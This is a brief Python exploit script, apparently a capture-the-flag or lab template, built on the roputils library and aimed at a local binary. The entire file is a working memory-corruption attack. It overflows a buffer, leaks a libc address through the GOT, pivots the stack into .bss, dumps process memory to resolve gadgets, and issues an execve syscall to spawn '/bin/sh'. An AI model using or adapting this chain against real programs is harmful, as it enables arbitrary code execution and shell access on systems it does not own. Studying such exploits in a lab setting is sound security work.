from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP('./a.out')
addr_stage = rop.section('.bss') + 0x400
nr_execve = 11

buf = rop.fill(offset)
buf += rop.call_chain(
    ['write', 1, rop.got('__libc_start_main'), 4],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p = Proc('./a.out')
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p32()

buf = rop.call_chain(
    ['write', 1, ref_addr, 0xc0000],
    ['read', 0, addr_stage-200, 200]
, pivot=addr_stage-200)
buf += rop.fill(400, buf)

p.write(buf)
data = p.read(0xc0000)
print "[+] len(data) = %x" % len(data)
rop.load(data, base=ref_addr)
addr_stage -= 200

buf = rop.syscall(nr_execve, addr_stage+100+8, addr_stage+100, 0)
buf += rop.fill(100, buf)
buf += p32(addr_stage+100+8)
buf += p32(0)
buf += rop.string('/bin/sh')
buf += rop.fill(200, buf)

p.write(buf)
p.wait(0)
